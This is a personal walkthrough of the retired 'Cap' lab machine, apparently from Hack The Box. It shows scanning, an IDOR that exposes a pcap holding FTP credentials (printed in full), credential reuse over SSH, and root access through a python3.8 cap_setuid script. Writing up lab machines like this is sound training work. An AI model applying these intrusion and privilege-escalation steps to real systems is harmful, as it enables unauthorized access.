# Cap    Linux    Easy    13-04-26


## 0. Machine Info
Name        : Cap
OS          : Linux
Difficulty  : Easy
Pwned Date  : 13-04-26
Status      : Retired


## 1. Recon


### 1.1 Nmap
# Initial fast scan
$ nmap -Pn -sS -sV -sC 10.xx.xx.xx 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-09 15:31 +0530
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Nmap scan report for 10.129.26.192
Host is up (0.22s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.92 seconds



### 1.2 Service Enum
PORT 21 - FTP vsftpd 3.0.3
  └── 'no' Anonymous login allowed

PORT 80 - HTTP Gunicorn
# go to 2.1

## 2. Web


### 2.1 Attack Surface
IDOR

Key Commands:
$ ffuf -w 1000.txt -u http://10.129.29.69/data/FUZZ -mc 200 -c -v

        /\___\  /\___\           /\___\       
       /\ \__/ /\ \__/  __  __  /\ \__/     
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.29.69/data/FUZZ
 :: Wordlist         : FUZZ: /home/tsfahmd01/1000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

[Status: 200, Size: 17144, Words: 7066, Lines: 371, Duration: 240ms]
| URL | http://10.129.29.69/data/1
    * FUZZ: 1

[Status: 200, Size: 17144, Words: 7066, Lines: 371, Duration: 253ms]
| URL | http://10.129.29.69/data/2
    * FUZZ: 2

[Status: 200, Size: 17147, Words: 7066, Lines: 371, Duration: 240ms]
| URL | http://10.129.29.69/data/0
    * FUZZ: 0

:: Progress: [1001/1001] :: Job [1/1] :: 153 req/sec :: Duration: [0:00:06] :: Errors: 0 ::

Interesting Findings:
  - /0 → 0.pcapp






## 3. Exploitation



### 3.1 Foothold
Vulnerability : idor, exposed creds, packet analysis
'nathan:Buck3tH4TF0RM3!'

Steps:
1. run ffuz to check for idor
2. /data/0 has an interesting .pcap file
3. exposed creds in ftp packets
4. cred reuse with ssh



Shell obtained:
  Type  : bind
  User  : nathan
  Method: ssh



### 3.2 CVEs / Exploits Used
CVE: exposed creds

## 4. Post-Exploitation


### 4.1 Local Enum
./linpeas.sh > local_enum.txt

Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
__________________   __________ ____________________ ___
         |               |                |           └──binary marked executable & inheritable. 
         |               |                └──allows program to bind to ports below 1024. 
         |               └──allows process to change UID
         └──file path, executable on the system.

'cap_setuid': Program with this capability can switch to a different user, necessary for running tasks requiring higher privileges.

'cap_net_bind_service': By default, only the root user can bind to these privileged ports.

'eip': Binary can inherit capabilities when executed by other processes, allowing privileged actions.


### 4.2 Privesc
Vector  : cap_setuid with root privs
Tool    : LinPEAS
  ./linpeas.sh > local_enum.txt

Steps:
1. python3.8 has all root privs
2. cap_setuid.py to run bash as root


cap_privesc.py:
import os

os.setuid(0)
os.system("/bin/bash")

Key commands:
  python3.8 cap_privesc.py
  



Result: root / SYSTEM shell obtained

## 5. Flags
Path to user flag : /home/nathan/user.txt
Path to root flag : /root/root.txt

## 6. Lessons Learned
What tripped me up:
- linpeas not giving full results

New tool/technique learned:
-  cap_setuid

Would do differently next time:
- try kernel exploits

## 7. Rabbit Holes
Dead End              : linpeas didnt give complete output
Way out    : worked fully when linpeas scan was stored in a file


